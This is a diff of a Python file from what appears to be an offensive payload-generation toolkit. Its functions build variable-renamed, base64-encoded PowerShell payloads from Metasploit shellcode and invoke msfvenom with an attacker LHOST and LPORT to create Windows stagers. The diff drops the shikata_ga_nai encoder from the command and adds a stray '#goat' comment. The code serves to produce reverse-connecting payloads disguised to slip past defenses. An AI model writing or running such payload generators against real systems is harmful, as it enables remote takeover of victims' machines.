@@ -1389,7 +1389,6 @@ def socket_listener(port):
 
 # generates powershell payload
 def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
-
     # generate our shellcode first
     shellcode = metasploit_shellcode(payload, ipaddr, port)
     try:
@@ -1441,7 +1440,6 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
         "$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
 
     # unicode and base64 encode and return it
-
     return base64.b64encode(powershell_command.encode('utf_16_le')).decode("ascii")
 
 # generate base shellcode
@@ -1450,11 +1448,12 @@ def generate_shellcode(payload, ipaddr, port):
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" %
+    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" %
                             (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     data = data.decode('ascii')
     # start to format this a bit to get it ready
+    #goat
     repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=',
              'unsignedcharbuf[]=', "b'", "'", '\\n']
     for repl in repls:
